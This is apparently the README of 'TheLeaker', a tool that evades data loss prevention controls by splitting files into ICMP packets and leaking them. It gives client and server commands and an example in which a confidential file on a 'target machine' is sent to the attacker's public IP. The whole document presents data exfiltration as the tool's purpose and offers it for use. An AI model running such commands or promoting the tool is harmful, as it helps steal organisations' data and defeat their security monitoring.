# TheLeaker

# What is?
TheLeaker is a DLP evasion tool that leaks files via the icmp protocol.

# How is it done?
TheLeaker uses an optional icmp field to send files by splitting them into small packets.

# How to use?
TheLeaker has two binaries: "theleaker-client" and "theleaker-server".

- theleaker-server: must be run on the machine that will receive the leaked files
- theleaker-client: must be run on target machine

# Commands
theleaker-server [your ip]
theleaker-client -s [target] -f [filename] -R [router ip] -r [rename file]

# Example

## On your machine
theleaker-server 192.168.0.10

## On target machine
theleaker-client -s 170.93.185.100 -f confidencial.txt -R 192.168.0.10 -r confidencial.txt

* The "target" parameter must be your public IP;
* The "router ip" parameter must be informed for future compatibilities
* Your local ip must be in DMZ


